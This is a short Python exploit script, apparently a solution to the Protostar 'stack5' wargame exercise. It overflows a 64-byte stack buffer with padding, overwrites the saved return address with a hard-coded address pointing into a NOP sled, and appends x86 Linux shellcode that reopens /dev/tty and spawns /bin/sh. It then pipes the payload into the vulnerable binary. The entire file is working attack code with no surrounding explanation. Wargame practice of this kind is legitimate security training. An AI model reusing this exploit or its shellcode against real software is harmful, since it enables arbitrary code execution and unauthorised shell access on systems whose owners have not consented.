#!/usr/bin/python

import os
import struct
import sys

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
shellcode += "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
shellcode += "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


# Overwrite buffer[64]
payload = "A" * 76

# Set EIP within sled
payload += struct.pack("I", 0xbffff7b0)

# NOP sled
payload += "\x90" * 16

payload += shellcode


#sys.stdout.write(payload)
#sys.stdout.flush()

os.system("echo \"%s\" | /opt/protostar/bin/stack5" % payload)
